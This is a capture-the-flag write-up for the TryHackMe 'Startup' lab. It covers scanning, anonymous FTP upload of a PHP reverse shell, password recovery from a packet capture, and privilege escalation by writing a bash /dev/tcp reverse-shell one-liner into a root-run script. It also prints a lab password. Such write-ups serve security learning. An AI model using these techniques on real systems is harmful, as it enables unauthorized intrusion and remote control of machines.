# [Startup](https://tryhackme.com/room/startup)
Abuse traditional vulnerabilities via untraditional means.


7/1

Nmap
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.122.230
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
MAC Address: 02:DC:92:CF:20:5F (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Logging into ftp with user anonymous:
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
possible user: maya

gobuster:
```
/files (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
```

It looks like the files directory is where the ftp files are. The file is writeable so we can try and put a reverse php shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and it works!
I tried common privesc techniques that did not work so looked around and found a incidents directory with suspicious.pcapnp file so lets download it!

`python -m SimpleHTTPServer 8080`

In the capture, an attacker uses the same method we do to break in and runs `python -c "import pty;pty.spawn('/bin/bash')"` to get a shell, tries a couple of passwords for www-data and lennie, and exits. I tried the password he uses and it works for lennie! c4ntg3t3n0ughsp1c3

The file in lennie's script folder is called /etc/print.sh and if we look at the permission, we are the owner! Lets put a reverse shell in there

`echo "bash -i >& /dev/tcp/10.10.122.230/1234 0>&1" > /etc/print.sh`

And wait for a connection!
